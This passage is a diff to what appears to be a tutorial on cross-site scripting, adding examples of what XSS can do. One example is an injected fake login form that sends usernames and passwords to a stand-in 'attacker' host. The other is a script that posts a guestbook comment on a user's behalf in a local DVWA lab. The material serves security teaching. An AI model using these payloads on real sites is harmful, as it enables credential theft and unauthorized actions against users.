@@ -94,6 +94,27 @@ This can result in
     ?>
     ```
 - Phishing
+  The payload below injects a form forcing unsuspecting users to enter login and password
+  ```bash
+  <h3>Please login to proceed</h3> 
+  <form action=http://attacker>
+    Username:
+    <br><input type="username" name="username"></br>
+    Password:
+    <br><input type="password" name="password"></br>
+    <br><input type="submit" value="Login"></br>
+  </form>
+  ```
+- Perform unauthorized activities
+    Posting comment on user's behalf
+    ```bash
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
+        xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+        xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
+    </script>
+    ```
 
 Types of XSS
   - Reflective
